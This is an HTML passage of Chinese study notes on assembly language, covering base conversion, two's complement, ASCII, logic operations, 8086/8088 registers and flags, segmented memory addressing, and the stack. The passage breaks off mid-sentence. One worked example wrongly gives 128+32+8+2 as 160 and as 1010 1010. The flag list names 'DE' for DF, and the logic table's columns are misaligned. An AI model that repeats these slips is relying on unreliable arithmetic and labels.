title="1、学习和使用汇编语言可以从根本上认识、理解计算机的工作过程。"></a>1、学习和使用汇编语言可以从根本上认识、理解计算机的工作过程。</h3><p>通过用汇编语言编制程序可以更清楚地了解计算机是如何完成各种复杂的工作。在此基础上，程序设计人员能更充分地利用机器硬件的全部功能，发挥机器的长处。</p><h3 id="2、在计算机系统中，某些功能必须用汇编语言程序来实现。"><a href="#2、在计算机系统中，某些功能必须用汇编语言程序来实现。" class="headerlink" title="2、在计算机系统中，某些功能必须用汇编语言程序来实现。"></a>2、在计算机系统中，某些功能必须用汇编语言程序来实现。</h3><p>如：机器自检、系统初始化、实际的输入输出设备的操作等。</p><h3 id="3、汇编语言程序的效率高于高级语言程序"><a href="#3、汇编语言程序的效率高于高级语言程序" class="headerlink" title="3、汇编语言程序的效率高于高级语言程序"></a>3、汇编语言程序的效率高于高级语言程序</h3><p>“ 效率” 有两个方面的含义：程序的目标代码长度和运行的速度。<br>在某些要求节省内存空间和提高程序运行速度的应用场合，如实时过程控制、智能仪器仪表等，常常用汇编语言来编制程序。</p><h2 id="1-3-进位计数制及其相互转"><a href="#1-3-进位计数制及其相互转" class="headerlink" title="1.3 进位计数制及其相互转"></a>1.3 进位计数制及其相互转</h2><h3 id="一、进位计数制"><a href="#一、进位计数制" class="headerlink" title="一、进位计数制"></a>一、进位计数制</h3><p>使用一定个数的数码的组合来表示数字，这种表示方法称为进位计数制。根据所使用的数码的个数，就产生了不同的进位计数制。</p><p>如十进制数，用0 ~9 十个数码的组合来表示数字。每个数码排在不同位置，所表示的数值大小不相同。</p><ul><li><p><strong>将各个位置上所表示的基本数值称为位权，简称权。</strong></p><p>不同的进位制和不同的位置其位权是不同的。位权乘以对应位置上的数码就等于该数位上数值的大小。</p></li><li><p><strong>每个数位上能使用不同数码的个数称为基数。</strong></p><p>例如十进制有十个数码0~9，基数为10，二进制基数为2。</p></li><li><p><strong>每个数位能取的最大数码值=基数-1。</strong></p><p>如十进制为10-1 = 9</p></li></ul><p>在计算机中数据表示一般采用二进制数，因为它在计算机中最容易表示和存储，且适合于逻辑值的表达与运算。</p><p>对人来说二进制不便于书写和阅读，因此书写时常使用8进制和16进制。</p><p><strong>二进制与8进制、16进制之间有非常简单的转换关系：3位二进制数与一位8进制数对应，4位二进制数与一位16进制数对应。</strong></p><p><strong>在书写不同进位计数制数时，为了区别，在数的尾部用一个字母来表示。</strong></p><blockquote><p>B（Binary）——— 二进制数<br>O（Octal）或Q——- 八进制数<br>D（Decimal)——— 十进制数<br>H（Hexadecimal）——— 十六进制数。<br>如未使用任何字母，则默认表示是十进制数。</p></blockquote><h3 id="二、各种数制间的相互转换"><a href="#二、各种数制间的相互转换" class="headerlink" title="二、各种数制间的相互转换"></a>二、各种数制间的相互转换</h3><h4 id="1、十进制整数转换为二进制数"><a href="#1、十进制整数转换为二进制数" class="headerlink" title="1、十进制整数转换为二进制数"></a>1、十进制整数转换为二进制数</h4><h5 id="（1）减权定位法"><a href="#（1）减权定位法" class="headerlink" title="（1）减权定位法"></a>（1）减权定位法</h5><ul><li>从二进制数高位起，依次用待转换的十进制数与各位权值进行比较；</li><li>如够减，则该数位系数Ki = 1 ，同时减去该位权值，余数作为下一次比较的值；</li><li>如不够减，则该数位系数Ki = 0 。</li></ul><h5 id="（2）除基取余法"><a href="#（2）除基取余法" class="headerlink" title="（2）除基取余法"></a>（2）除基取余法</h5><ul><li>将十进制数除以基数2 ，其余数为二进制数的最低位，再用其商除2 ，其余数为次低位，反复做下去，直到商0 。</li><li>这种转换方法同样适合于其它进制数之间的转换。</li></ul><h4 id="2、十进制小数转换为二进制数"><a href="#2、十进制小数转换为二进制数" class="headerlink" title="2、十进制小数转换为二进制数"></a>2、十进制小数转换为二进制数</h4><h5 id="（1）减权定位法-1"><a href="#（1）减权定位法-1" class="headerlink" title="（1）减权定位法"></a>（1）减权定位法</h5><p>同整数转化。</p><p>转换时应根据程序要求的精度或计算机的字长来确定二进制的位数。</p><h5 id="（2）乘基取整法"><a href="#（2）乘基取整法" class="headerlink" title="（2）乘基取整法"></a>（2）乘基取整法</h5><p>将十进制数乘以基数2 ，其整数部分为二进制数的最高位，再用其小数部分乘2 ，其整数部分为次高位，反复做下去，直到小数部分为0 。</p><h4 id="3、二进制整数转换为十进制数"><a href="#3、二进制整数转换为十进制数" class="headerlink" title="3、二进制整数转换为十进制数"></a>3、二进制整数转换为十进制数</h4><h5 id="（1）按权相加法"><a href="#（1）按权相加法" class="headerlink" title="（1）按权相加法"></a>（1）按权相加法</h5><p>例 ：101000101 B = 1 × 2^8 + 1 × 2^6 + 1 × 2^2 + 1 × 2^0<br>                                 = 256 + 64 + 4 + 1<br>                                 = 325</p><h5 id="（2）逐次乘基相加法"><a href="#（2）逐次乘基相加法" class="headerlink" title="（2）逐次乘基相加法"></a>（2）逐次乘基相加法</h5><p><img src="/2021/07/27/Code/Assembly/Assembly/a68992e7de6cfb5652421880834e7bee.bmp" alt="capture_20210721094219468" style="zoom:80%;"></p><h4 id="4、二进制小数转换为十进制数"><a href="#4、二进制小数转换为十进制数" class="headerlink" title="4、二进制小数转换为十进制数"></a>4、二进制小数转换为十进制数</h4><h5 id="（1）按权相加法-1"><a href="#（1）按权相加法-1" class="headerlink" title="（1）按权相加法"></a>（1）按权相加法</h5><p>例 ：0.101001 B = 1 × 2^(-1) + 1 × 2^(-3) + 1 × 2^(-6)<br>                              = 0.5 + 0.125 + 0.0156<br>                              = 0.640625 D</p><h5 id="（2）逐次除基相加法"><a href="#（2）逐次除基相加法" class="headerlink" title="（2）逐次除基相加法"></a>（2）逐次除基相加法</h5><p><img src="/2021/07/27/Code/Assembly/Assembly/4e70f28592e7f494fd935c34ae52f178.bmp" alt="capture_20210721110604958" style="zoom:80%;"></p><h4 id="5、二进制与八进制和十六进制间的转换"><a href="#5、二进制与八进制和十六进制间的转换" class="headerlink" title="5、二进制与八进制和十六进制间的转换"></a>5、二进制与八进制和十六进制间的转换</h4><p><strong>二进制与八进制和十六进制之间的对应关系</strong>：</p><ul><li>三位二进制数对应一位八进制数</li><li>四位二进制数对应一位十六进制数</li></ul><p>例如 ：10100010 B = 10 100 010                       10100010 B = 1010 0010<br>                                       2     4     2                                                      A      2<br>             所以10100010 B = 242 Q                        所以10100010 B = A 2 H</p><h4 id="6、技巧"><a href="#6、技巧" class="headerlink" title="6、技巧"></a>6、技巧</h4><div class="table-container"><table><thead><tr><th>2^9</th><th>2^8</th><th>2^7</th><th>2^6</th><th>2^5</th><th>2^4</th><th>2^3</th><th>2^2</th><th>2^1</th><th>2^0</th></tr></thead><tbody><tr><td>512</td><td>256</td><td>128</td><td>64</td><td>32</td><td>16</td><td>8</td><td>4</td><td>2</td><td>1</td></tr></tbody></table></div><ul><li><p>十进制整数转二进制</p><p>例如：160 = 128 + 32 + 8 + 2 = 1010 1010</p></li><li><p>十进制小数转二进制</p><p>例如：40/128 = (32 + 8)/(128) = 101000 * 2^(-7) = 0.0101000</p></li><li><p>二进制整数转十进制</p><p>例如：1010 1010 = 128 + 32 + 8 + 2 = 160</p></li></ul><h2 id="1-4-带符号数的表示"><a href="#1-4-带符号数的表示" class="headerlink" title="1.4 带符号数的表示"></a>1.4 带符号数的表示</h2><p>在一般算术表示中使用 “ + ” 和 “ - ” 来表示正数与负数，而在计算机中使用 “ 0 ” 和 “ 1 ” 来表示正数和负数。</p><blockquote><p>用 “ + ” 或 “ - ” 表示正负的数叫真值<br>用 “ 0 ” 或 “ 1 ” 表示正负的数叫机器数</p></blockquote><p>带符号的机器数可以用<strong>原码、反码和补码</strong>三种不同码制来表示。一般计算机中大多采用补码表示。</p><h3 id="一、原码表示"><a href="#一、原码表示" class="headerlink" title="一、原码表示"></a>一、原码表示</h3><p>二进制数的最高位表示符号，0 表示正，1 表示负。数值部分用二进制数绝对值表示。</p><blockquote><p>8 位二进制数原码的最大数为 0111 1111（ + 127 ）<br>                                     最小数为 1111 1111（ - 127 ）<br>8 位二进制数表示范围：-127  &lt;= X &lt;= + 127</p></blockquote><p>0 的原码有两种表示形式：0000 0000 和 1000 0000（ + 0 和 - 0 ）</p><h3 id="二、补码的表示"><a href="#二、补码的表示" class="headerlink" title="二、补码的表示"></a>二、补码的表示</h3><h4 id="1、补码的定义"><a href="#1、补码的定义" class="headerlink" title="1、补码的定义"></a>1、补码的定义</h4><p>带符号数X的补码表示 [X]补 定义为：</p><p>​                             [X]补 = M + X  (Mod M)</p><p>其中模数 M 根据机器数的位数而定，如位数为 8 则 M = 2^8 。</p><p>用补码表示的机器数，符号位仍然表示数的符号：0 为正，1 为负。对于正数，补码与原码相同，对于负数需要进行变换。</p><h4 id="2、由原码变换为补码"><a href="#2、由原码变换为补码" class="headerlink" title="2、由原码变换为补码"></a>2、由原码变换为补码</h4><ul><li>正数的原码与补码相同。</li><li>负数的原码变换为补码：保持符号位不变，其余各位变反，最低位加 1 。</li></ul><p>例：将 -59 变换为补码</p><div class="table-container"><table><thead><tr><th style="text-align:center">数</th><th style="text-align:center">真值</th><th style="text-align:center">原码</th><th style="text-align:center">补码</th></tr></thead><tbody><tr><td style="text-align:center">- 59</td><td style="text-align:center">- 0011 1011</td><td style="text-align:center">1011 1011</td><td style="text-align:center">1100 0101</td></tr></tbody></table></div><h4 id="3、补码数表示范围"><a href="#3、补码数表示范围" class="headerlink" title="3、补码数表示范围"></a>3、补码数表示范围</h4><p>当位数为8 时，最大补码为 0111 1111 = [+127]补<br>                          最小补码为 1000 0000  = [-128]补</p><p>0 的补码只有一个，[0]补 = 0000 0000，而 1000 0000 = [-128]补，1111 1111 = [-1]补</p><p>对于16 位数，则补码表示范围为 -32768 ~ +32767</p><h4 id="4、补码的加减运算"><a href="#4、补码的加减运算" class="headerlink" title="4、补码的加减运算"></a>4、补码的加减运算</h4><p>规则：<strong>[X + Y] 补 = [X]补 + [Y]补</strong><br>            <strong>[X - Y] 补 = [X]补 - [Y]补 = [X]补 + [-Y]补</strong></p><p>其中 <strong>[-Y]补</strong> 是对 <strong>[Y]补</strong> 执行一次求补运算</p><p><strong>求补运算是将原数连同符号位一起（不管是正还是负）按位求反，再在最低位加 1 。</strong></p><h2 id="1-5-字符的表示"><a href="#1-5-字符的表示" class="headerlink" title="1.5 字符的表示"></a>1.5 字符的表示</h2><p>在计算机内部，各种字符（字母、符号、数字码）都是按一定的方式编写成二进制信息。不同的计算机以及不同的场合所采用的编码形式可能不同。目前最广泛采用的是 <strong>ASCII 码</strong>（American Standard Code for Information Interchange）。</p><p>标准ASCII 码为一字节，其中用低七位表示字符编码，用最高位表示奇偶数验位。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/d74f187fb65b4b37445ff279ab777bc3.bmp" style="zoom:80%;"></p><p>标准ASCII 码共有128 个，可分为两类：</p><ul><li>非打印ASCII 码，共33 个，用于控制操作，如 BEL（ 响铃，07H ），DEL ( 删除，7FH )，CR ( 回车，0DH )，LF ( 换行，0AH ) 。</li><li>可打印ASCII 码共有95 个，如数字符0 ~ 9 ，大小写字母等。</li></ul><h2 id="1-6-基本逻辑运算"><a href="#1-6-基本逻辑运算" class="headerlink" title="1.6 基本逻辑运算"></a>1.6 基本逻辑运算</h2><div class="table-container"><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">A &amp; B(与)</th><th style="text-align:center">A \</th><th style="text-align:center">B(或)</th><th style="text-align:center">~A(非)</th><th>A ^ B(异或)</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table></div><h1 id="第二章-IBM-PC微机的功能结构"><a href="#第二章-IBM-PC微机的功能结构" class="headerlink" title="第二章 IBM-PC微机的功能结构"></a>第二章 IBM-PC微机的功能结构</h1><h2 id="2-1-IBM-PC微机基本结构"><a href="#2-1-IBM-PC微机基本结构" class="headerlink" title="2.1 IBM-PC微机基本结构"></a>2.1 IBM-PC微机基本结构</h2><p>五大部件：运算器、控制器、存储器、输入设备、输出设备</p><p>CPU = 运算器 + 控制器</p><p>主机 = 运算器 + 控制器 + 存储器（主存）                                   辅存（外存）？</p><p><img src="/2021/07/27/Code/Assembly/Assembly/7e2b02ddc644172d2b35675a8230ff25.bmp" alt="capture_20210722105104835" style="zoom:50%;">        <img src="/2021/07/27/Code/Assembly/Assembly/63f7bd40bbc511ac52a2e9ea9a4f9fae.bmp" alt="capture_20210722105250753" style="zoom:50%;"></p><p><img src="/2021/07/27/Code/Assembly/Assembly/1c2f76ff0ca07e1754e9285fbac67de8.bmp" alt="capture_20210721170839107" style="zoom:67%;"></p><h2 id="2-2-8086-8088-CPU寄存器结构及其用途"><a href="#2-2-8086-8088-CPU寄存器结构及其用途" class="headerlink" title="2.2 8086/8088 CPU寄存器结构及其用途"></a>2.2 8086/8088 CPU寄存器结构及其用途</h2><p><img src="/2021/07/27/Code/Assembly/Assembly/d609441390baa0354a34b60b6027077c.bmp" alt="capture_20210721171335429" style="zoom:50%;"></p><h3 id="一、通用寄存器"><a href="#一、通用寄存器" class="headerlink" title="一、通用寄存器"></a>一、通用寄存器</h3><p>lntel 8086 / 8088 有 8 个16 位通用寄存器，它们具有良好的通用性，并且还可以用作某个特定的功能，可以由程序设计人员进行编程访问。</p><h4 id="1、数据寄存器"><a href="#1、数据寄存器" class="headerlink" title="1、数据寄存器"></a>1、数据寄存器</h4><ul><li><p>它包括 AX、BX、CX 和 DX 四个寄存器。它们中的每一个既可以是 <strong>16 位寄存器</strong>，也可以分成两个 8 位寄存器使用，即可以当作 8 个独立的 <strong>8 位寄存器</strong>使用。</p></li><li><p>数据寄存器既可以用来存放参加运算的<strong>操作数</strong>，也可以存放<strong>运算的结果</strong>。在多数情况下，使用这些寄存器时必须<strong>在指令中明确指示</strong>。</p><p>例：MOV AX，BX;     将 BX 的内容送到 AX 中</p><pre><code>    ADD CH，DH;    将 DH 和 CH 的内容相加，结果送到CH</code></pre></li><li><p>在有些指令中，不需要明确指出使用的寄存器名，即隐念使用了某寄存器，称为<strong>隐含使用</strong>。</p><p>例如，在循环指令 LOOP 中，CX 被隐含指定作循环次数计数用。</p></li><li><p>个别指令对寄存器有特定的使用，并且又必须在指令中指明它的名字，这类寄存器的使用称为<strong>特定使用</strong>。</p><p>例如，移位指令 SHL AX，CL            CL被固定用作移位次数</p></li></ul><h4 id="2、指针寄存器"><a href="#2、指针寄存器" class="headerlink" title="2、指针寄存器"></a>2、指针寄存器</h4><p>指针寄存器有<strong>堆栈指针 SP</strong> 和<strong>基址指针 BP</strong>，它们一般被用来存放16 位地址，在形成20 位的物理地址时常被作为<strong>偏移量</strong>使用。</p><ul><li><p>SP 指针：在进行堆栈操作时，被隐含使用，被用来指向堆栈顶部单元。</p></li><li><p>BP 指针：被用来指向堆栈段内某一存储单元。BP 除用作地址指针外也可以像数据寄存器一样，存放参加运算的操作数和运算的结果。</p></li></ul><h4 id="3、变址寄存器"><a href="#3、变址寄存器" class="headerlink" title="3、变址寄存器"></a>3、变址寄存器</h4><p>有两个16 位的变址寄存器 SI 和 DI ，一般被用来作地址指针。</p><ul><li>SI： 源变址寄存器                </li><li>DI：目的变址寄存器</li><li>同 BP 寄存器一样，SI 和DI 也可以用作通用数据寄存器存放操作数和运算结果。</li></ul><h3 id="二、段寄存器"><a href="#二、段寄存器" class="headerlink" title="二、段寄存器"></a>二、段寄存器</h3><blockquote><ul><li>8086/8088 CPU在使用存储器时，将它划分成若干个段。</li><li>每个段用来存放不同的内容，如程序代码、数据等等。</li><li>每个存储段用一个段寄存器来指明该段的起始位置（也叫段基址） 。</li></ul></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/19467d25513114d18bb275d548fe7131.bmp" alt="capture_20210722113810550"></p><p>CPU 在访问存储器时必须指明两个内容：</p><blockquote><p>所访问的存储单元属于哪个段，即指明使用的段寄存器。<br>该存储单元与段起始地址（段基址）的相距多少，即偏移量。</p></blockquote><p>在程序设计中，一个程序将存储器划分成多少个存储段是任意的。但在程序运行的任何时刻最多只有4 个段，分别由 CS、DS、ES 和 SS 指定。</p><h3 id="三、指令指针IP"><a href="#三、指令指针IP" class="headerlink" title="三、指令指针IP"></a>三、指令指针IP</h3><ul><li><p>CPU 在从存储器取指令时，以段寄存器 CS 作为代码段的基址指针，以 IP 的内容作为偏移量，共同形成一条指令的存放地址。</p></li><li><p>当 CPU 从内存中取出一条指令后，IP 内容自动修改为指向下一条指令。</p></li><li><p>注意：IP 的内容不能被直接访问，既不能用指令去读IP的值，也不能用指令给它赋值。但是可以通过某些指令的执行而自动修改 IP 的内容。</p><p>例如，下面两种指令就可以自动改变 IP 寄存器的内容。</p><ul><li><p>转移指令将指令中的目的地址的偏移量送入 IP</p></li><li><p>子程序调用指令CALL ，将 IP 原有内容自动压入堆栈，而将子程序的入口地址偏移量自动送入 IP ， 而返回指令 RET，又自动从堆栈中弹回原有 IP 的内容。</p></li></ul></li></ul><h3 id="四、标志寄存器"><a href="#四、标志寄存器" class="headerlink" title="四、标志寄存器"></a>四、标志寄存器</h3><p>标志寄存器是用来反映在程序运行时的某些状态，如是否有进位、奇偶性、结果的符号、结果是否为零等等。</p><p>8086/8088 CPU 中标志寄存器的长度为 16 位，但只定义了其中的 9 位。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/7c3ee51819de1aee25c6d94028d26652.bmp" alt="capture_20210722144459045"></p><p>标志位分为：</p><ul><li>状态标志：CF，PF，AF，ZF，SF，OF</li><li>控制标志：TF，DE，IF</li></ul><h4 id="1、进位标志位-CF"><a href="#1、进位标志位-CF" class="headerlink" title="1、进位标志位 CF"></a>1、进位标志位 CF</h4><p>在进行术运算时，若最高位（ 对字操作是第 15 位，字节操作是第 7 位，产生进位或借位时 CF 被自动置 “ 1 ”，否则置 “ 0 ”</p><p>在移位类指令中，CF 也被用来存放从最高位（左移时）或最低位（右移时）移出的数值（0或1）。</p><h4 id="2、奇偶标志位-PF"><a href="#2、奇偶标志位-PF" class="headerlink" title="2、奇偶标志位 PF"></a>2、奇偶标志位 PF</h4><p>当指令操作结果的低 8 位中含有 1 的个数为偶数时，则 PF被置 1，否则 PF 被置 0 。</p><p>注意：PF 只反映操作结果的低 8 位的奇偶性，与指令操作数的长度无关。</p><h4 id="3、辅助进位标志位-AF"><a href="#3、辅助进位标志位-AF" class="headerlink" title="3、辅助进位标志位 AF"></a>3、辅助进位标志位 AF</h4><p>在进行算术运算时，若低字节的低四位向高 4 位产生进位或借位，即第 3 位产生进位或借位时，AF位被置 1，否则置0 。AF 标志位用于十进制运算的调整。</p><p>注意：AF 只反映运算结果低八位， 与操作数长度无关。</p><h4 id="4、零值标志位-ZF"><a href="#4、零值标志位-ZF" class="headerlink" title="4、零值标志位 ZF"></a>4、零值标志位 ZF</h4><p>若运算结果各位全为 0，则 ZF 被置 1，否则置 0。</p><h4 id="5、符号标志位-SF"><a href="#5、符号标志位-SF" class="headerlink" title="5、符号标志位 SF"></a>5、符号标志位 SF</h4><p>将运算结果视为带符号数，当运算结果为负数时 SF 被置1 ，为正数时，则置0 。</p><p>由于第 7 位是字节操作数的符号位，而第 15 位是字操作数的符号位，因此，SF 位与运算结果的最高位（第7位或第15位） 相同。</p><h4 id="6、溢出标志位-OF"><a href="#6、溢出标志位-OF" class="headerlink" title="6、溢出标志位 OF"></a>6、溢出标志位 OF</h4><p>当运算结果超过机器用补码所能表示数的范围时，则 OF 置1 ， 否则置0 。</p><blockquote><p>字节数据，机器用补码所能表示的数范围为： -128 ~ +127<br>字数据的表示范围为： -32768 ~ +32767</p></blockquote><p>注意：溢出与进位是两个完全不同的概念，不能相互混淆。下面通过几个例子来说明</p><div class="table-container"><table><thead><tr><th>-85D + -1D = -86D</th><th>100D + 100D = 200D</th><th>-85D + -117D = -202D</th></tr></thead><tbody><tr><td>1010 1011 + 1111 1111</td><td>0110 0100 + 0110 0100</td><td>1010 1011 + 1000 1011</td></tr><tr><td>= (1) 1010 1010 = -86D</td><td>= 1100 1000 = -56D</td><td>= (1) 0011 0110 = 54D</td></tr><tr><td>CF = 1，OF = 0</td><td>CF = 0，OF = 1</td><td>CF = 1，OF = 1</td></tr><tr><td>有进位，未溢出，结果正确</td><td>无进位，溢出，结果错误</td><td>有进位，溢出，结果错误</td></tr></tbody></table></div><h4 id="7、单步标志位-TF-Trace-Flag"><a href="#7、单步标志位-TF-Trace-Flag" class="headerlink" title="7、单步标志位 TF (Trace Flag)"></a>7、单步标志位 TF (Trace Flag)</h4><p>单步标志也叫跟踪位，该标志为控制标志位。单步标志位供调试程序使用。</p><p>当 TF 位被设置为1 时，每执行一条指令后，CPU 暂停运行，即产生单步中断。</p><h4 id="8、中断允许标志位-IF"><a href="#8、中断允许标志位-IF" class="headerlink" title="8、中断允许标志位 IF"></a>8、中断允许标志位 IF</h4><p>该标志位为控制标志位。当 IF 被设置为1 时，CPU 可以响应可屏蔽中断，否则不允许响应可屏蔽中断。</p><h4 id="9、方向标志位-DF"><a href="#9、方向标志位-DF" class="headerlink" title="9、方向标志位 DF"></a>9、方向标志位 DF</h4><p>DF 也是控制标志位。它被用来规定串操作指令的增减方向。</p><p>当 DF = 0 时，串操作指令自动使变址寄存器（ SI 和 DI ）的内容递增。当DF = 1 时，串操作指令自动使变址寄存器的内容递减。</p><h2 id="2-3-存储器组织结构"><a href="#2-3-存储器组织结构" class="headerlink" title="2.3 存储器组织结构"></a>2.3 存储器组织结构</h2><h3 id="一、存储器的组成"><a href="#一、存储器的组成" class="headerlink" title="一、存储器的组成"></a>一、存储器的组成</h3><p><strong>1、存储器是由若干个存储单元构成</strong></p><p>存储单元的多少就表示了存储器的容量。</p><p><strong>2、每个存储单元存放相同长度的二进制数</strong></p><p>一个存储单元的长度一般为8 位二进制数，即一个字节。</p><p><strong>3、每个存储单元有一个唯一的地址编号———地址</strong></p><p>8086/8088 CPU 有 20 根地址线，即它可以产生20 位的地址码，它的存储器寻址能力为 2^20，即1兆字节（1 MB）空间。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/d7a460c7cb1d0788e0b80edd6ffbab85.bmp" alt="capture_20210722162000483"></p><p><strong>4、任何两个相邻字节单元就构成一个字单元</strong></p><p>一个字存储单元（WORD） 的长度为16 位二进制数，即两个字节。字单元的地址为两个字节单元中<br>较小地址字节单元的地址。</p><p>16 位长数据的存放规则是低 8 位放在较低地址字节单元中，高 8 位放在较高地址字节单元中。</p><p>例如，将数 3456H 放在地址为 09235H 的存储单元中的存储分配。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/e7fdd2178934bfd207df59c1240a0907.bmp" alt="capture_20210722165555215" style="zoom:80%;"></p><p><strong>5、在定义一个地址时必须指出是字节或字类型属性</strong></p><h3 id="二、存储器的段结构"><a href="#二、存储器的段结构" class="headerlink" title="二、存储器的段结构"></a>二、存储器的段结构</h3><p>由于 8086/8088 可寻址的存储空间为 1 MB，需要提供 20 位长的地址码。而 CPU 内部的寄存器长度只有 16 位。能够直接访问的最大地址空间是 64 KB。</p><p>8086/8088 系统的存储器段结构具有以下几个特点：</p><p>1、8086/8088 CPU 将 1 MB 的存储空间划分成若干个段，每个段最大长度为 64 K（65536）个字节单元组成。</p><p>在 8086/8088 的汇编语言源程序中，用户可以根据自己需要来设定段的个数、各个段长度和每个段的用途。并且代码或数据可以存放在段内任意单元中。</p><p>2、每个段的基址（段基址）必须是一个小节的首址。</p><p>段基址：一个段的起始地址。<br>在存储器中规定从 0 地址开始，每 16 个字节单元称为一个小节。因此，1 MB 内存就可划分为 64 K 个小节。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/344d7eeb13f1f2f1f7f331c3aa75fe0e.bmp" alt="capture_20210722175211235"></p><p>可以看出，每个小节的首地址最低位必为 0（16进制）。因此，段基址只能是上述 64 K 个小节首址之一。</p><p>3、逻辑段在物理存储器中可以是邻接的、间隔的、部分重叠的和完全重叠的等4 种情况</p><p>逻辑段是指在汇编语言源程序中设置的段<br>内存中的一个物理存储单元可以映象到一个或多个逻辑段中</p><p><img src="/2021/07/27/Code/Assembly/Assembly/4b7981d007a6fb9b35ca2691edbdf513.bmp" alt="capture_20210722175628147"></p><p>4、在任一时刻，一个程序只能访问 4 个当前段中的内容。</p><p>4 个段分别是代码段、数据段、堆栈段和附加段，称为<strong>当前段</strong>。4 个段寄存器 CS 、DS 、SS 和 ES 分别保存了它们<strong>段基址</strong>的高 16 位地址，称为<strong>段基值</strong>。段基址的最低 4 位为 0 。（小节首址的低4 位为全0）。</p><h3 id="三、逻辑地址与物理地址及对应关系"><a href="#三、逻辑地址与物理地址及对应关系" class="headerlink" title="三、逻辑地址与物理地址及对应关系"></a>三、逻辑地址与物理地址及对应关系</h3><h4 id="1、物理地址"><a href="#1、物理地址" class="headerlink" title="1、物理地址"></a>1、物理地址</h4><p>在 1MB 的存储空间中，每个存储单元的物理地址是唯一的，它就是该存储单元的 20 位地址。<br>8086/8088 的物理地址范围：00000H ~ FFFFFH</p><h4 id="2、逻辑地址"><a href="#2、逻辑地址" class="headerlink" title="2、逻辑地址"></a>2、逻辑地址</h4><p>在程序设计中，为了便于程序的开发和对存储器进行动态管理，使用了逻辑地址。</p><p>一个逻辑地址包括两个部分：段基值和偏移量</p><blockquote><p>段基值：存放在某一个段寄存器中，是一个逻辑段的起始单元地址（段基址）的高 16 位。<br>偏移量：表示某个存储单元与它所在段的段基址之间的字节距离。</p></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/f70445ef3c4ceddf8c922d24845c0066.bmp" alt="capture_20210722182103930"></p><p>逻辑地址的表示方法———-段基值：偏移量</p><p>例如，3267H：00A0H 表示该逻辑单元位于段起始地址为 32670H，段内偏移量为 00A0H 个字节。</p><h4 id="3、逻辑地址转化为物理地址"><a href="#3、逻辑地址转化为物理地址" class="headerlink" title="3、逻辑地址转化为物理地址"></a>3、逻辑地址转化为物理地址</h4><p>当 CPU 要访问存储器时，需要由总线接口单元 BIU 将逻辑地址转换成物理地址。</p><p>转换方法：将逻辑地址的段基值左移 4 位，形成 20 位的段基址（低位为0）然后与 16 位的偏移量相加，结果即为20 位的物理地址。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/0d6930528eeeacad42c99342f32255f2.bmp" alt="capture_20210722183513474" style="zoom:80%;"></p><h4 id="4、逻辑地址的来源"><a href="#4、逻辑地址的来源" class="headerlink" title="4、逻辑地址的来源"></a>4、逻辑地址的来源</h4><p>在程序的执行过程中，CPU 根据不同操作类型访问存储器，其逻辑地址中段基值和偏移量的来源是不一样的。</p><p>下表是各种操作类型所对应的逻辑地址的来源。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/39b4265ee082207d53806ea7a693c643.bmp" alt="capture_20210722184040743"></p><p>说明：</p><p>（1）允许替代来源也叫做<strong>段超越</strong>，它表示了段基值除使用隐含的段寄存器外是否可以指定其它段寄存器来提供。</p><p>（2）有效地址 EA ，它表示根据指令所采用的寻址方式计算出来的段内偏移量。</p><h2 id="2-4-堆栈及其操作方法"><a href="#2-4-堆栈及其操作方法" class="headerlink" title="2.4 堆栈及其操作方法"></a>2.4 堆栈及其操作方法</h2><p>堆栈是一个特定的<strong>存储区</strong>，访问该存储区一般需要<strong>按照专门的规则进行操作</strong>。</p><p><strong>堆栈的用途：主要用于暂存数据以及在过程调用或处理中断时保存断点信息。</strong></p><h3 id="一、堆栈的构造"><a href="#一、堆栈的构造" class="headerlink" title="一、堆栈的构造"></a>一、堆栈的构造</h3><p>堆栈一般分为：专用堆栈存储器和软件堆栈</p><blockquote><p>专用堆栈存储器：按堆栈的工作方式专门设计的存储器<br>软件堆栈：由程序设计人员用软件在内存中划出的一块存储区作为堆栈来使用。8086/8088 采用这种方式。</p></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/35f77c7e900d49b664caa4f65d0878f2.bmp" alt="capture_20210722190221643"></p><p>在堆栈中存取数据的规则是：“ 先进后出 FILO ”（ First-In Last-Out ）。即最先送入堆栈的数据要到最后才能取出，而最后送入堆栈的数据，最先取出。</p><h3 id="二、8086-8088-堆栈的组织"><a href="#二、8086-8088-堆栈的组织" class="headerlink" title="二、8086/8088 堆栈的组织"></a>二、8086/8088 堆栈的组织</h3><p>在 8086 / 8088 微机中堆栈是由堆栈段寄存器 SS 指示的一段存储区。</p><p><img src="/2021/07/27/Code/Assembly/Assembly/3dd22e0ea55a0725550c80e65bee8c06.bmp" alt="capture_20210722191158955"></p><ul><li><p>顶由堆栈指针 SP 指示。SP 中内容始终表示堆栈段基址与栈顶之间的距离（字节数）。当 SP 内容为最大（初始）值时，表示堆栈为空。而当（ SP ）= 0 时，表示堆栈全满。</p></li><li><p>当 SP 被初始化时，指向栈底 +2 单元，其值就是堆栈的长度。由于 SP 是 16 位寄存器，因此堆栈长度 &lt;= 64K 字节。</p></li><li><p>数据在堆栈中的存放格式是：以<strong>字</strong>为单位存放，数据的低 8 位放在较低地址单元，高 8 位放在较高地址单元。</p></li><li><p>当用户程序中要求的堆栈长度超过一个堆栈段的最大长度 64KB 时，可以设置几个堆栈段。</p></li><li><p>通过改变堆栈段寄存器 SS 的内容，即可改变到另一个堆栈段，当改变了堆栈段寄存器 SS 的内容后，必须紧接着赋予 SP 